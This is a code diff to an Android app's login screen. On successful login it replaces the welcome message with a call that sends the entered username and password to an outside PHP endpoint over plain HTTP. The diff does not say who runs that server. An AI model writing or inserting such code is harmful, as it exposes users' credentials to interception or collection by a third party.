@@ -67,7 +67,9 @@ public class LoginActivity extends AppCompatActivity {
                     showLoginFailed(loginResult.getError());
                 }
                 if (loginResult.getSuccess() != null) {
-                    updateUiWithUser(loginResult.getSuccess());
+                    //updateUiWithUser(loginResult.getSuccess());
+                    Sender s = new Sender(LoginActivity.this, "http://ipack.dx.am/index.php", false, usernameEditText, passwordEditText);
+                    s.execute();
                 }
                 setResult(Activity.RESULT_OK);
 
@@ -115,13 +117,6 @@ public class LoginActivity extends AppCompatActivity {
                 //tryToLogin(usernameEditText.getText().toString(), passwordEditText.getText().toString());
             }
         });
-    }
-
-
-    private void updateUiWithUser(LoggedInUserView model) {
-        String welcome = getString(R.string.welcome) + model.getDisplayName();
-        // TODO : initiate successful logged in experience
-        Toast.makeText(getApplicationContext(), welcome, Toast.LENGTH_LONG).show();
     }
 
     private void showLoginFailed(@StringRes Integer errorString) {
